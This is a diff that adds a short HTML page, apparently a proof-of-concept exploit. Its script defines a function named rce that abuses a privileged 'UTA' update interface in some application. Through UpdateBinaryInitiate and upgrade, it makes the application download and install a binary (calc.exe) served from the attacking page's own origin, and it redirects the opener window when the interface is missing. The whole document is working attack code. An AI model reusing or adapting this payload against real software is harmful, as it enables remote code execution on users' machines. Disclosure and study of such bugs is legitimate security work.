@@ -1,0 +1,17 @@
+<!DOCTYPE HTML>
+<html>
+<h1>asd</h1>
+<script>
+    async function rce() {
+        await UTA.Update.UpdateBinaryInitiate(`${location.origin}/calc.exe`, "test");
+        await UTA.Update.upgrade("test");
+    }
+    if (window.UTA == undefined) {
+        console.log(1);
+        opener.location.href = location.href;
+    } else {
+        console.log(2);
+        rce();
+    }
+</script>
+</html>
